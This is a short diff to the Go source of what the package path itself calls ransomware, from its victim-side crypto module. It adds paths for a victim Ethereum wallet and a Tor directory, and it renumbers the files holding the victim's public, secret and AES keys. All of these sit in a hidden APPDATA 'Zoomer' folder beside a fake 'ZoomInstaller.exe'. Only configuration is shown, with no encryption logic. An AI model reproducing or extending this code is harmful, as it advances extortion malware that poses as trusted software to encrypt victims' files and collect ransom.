@@ -11,10 +11,12 @@ const pkg = "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
 var (
     workDir = os.Getenv("APPDATA") + `\Zoomer`
 
-    victimPublicKey = workDir + `\a.flu`
-    victimSecretKey = workDir + `\b.flu`
-    victimAESKey    = workDir + `\c.flu`
+    victimEthereumWallet = workDir + `\a.flu`
+    victimPublicKey      = workDir + `\b.flu`
+    victimSecretKey      = workDir + `\c.flu`
+    victimAESKey         = workDir + `\d.flu`
 
+    torDirectory  = workDir + `\Tor`
     zoomInstaller = workDir + `\ZoomInstaller.exe`
 )
 
